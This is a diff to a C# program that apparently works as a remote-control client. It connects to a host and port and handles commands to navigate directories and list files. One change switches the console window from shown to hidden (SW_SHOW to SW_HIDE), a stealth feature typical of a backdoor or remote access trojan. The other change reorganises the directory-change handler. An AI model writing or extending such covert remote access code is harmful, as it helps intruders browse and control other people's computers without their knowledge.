@@ -35,7 +35,7 @@ internal class Pro
         string host = "127.0.0.1";
             int port = 25565;
         try {
-            ShowWindow(GetConsoleWindow(), SW_SHOW);
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
             
             bool IsDirectoryEmpty(string path)
         {
@@ -308,22 +308,23 @@ internal class Pro
                         if (parse_comamnd.Length > 1)
                         {
                             select_dir = parse_comamnd[1];
+                            if (Directory.Exists(direct_work + select_dir))
+                            {
+                                requst = "open dir";
+                                direct_work += select_dir + "\\";
+                            }
+                            else
+                            {
+                                requst = "not dir";
+                            }
+                            if (Directory.Exists(select_dir))
+                            {
+                                direct_work = select_dir + "\\";
+                                requst = "open dir";
+                            }
                         }
 
-                        if (Directory.Exists(direct_work + select_dir))
-                        {
-                            requst = "open dir";
-                            direct_work += select_dir+"\\";
-                        }
-                        else
-                        {
-                            requst = "not dir";
-                        }
-                        if (Directory.Exists(select_dir))
-                        {
-                            direct_work = select_dir + "\\";
-                            requst = "open dir";
-                        }
+                       
 
                         break;
                     case "ls":
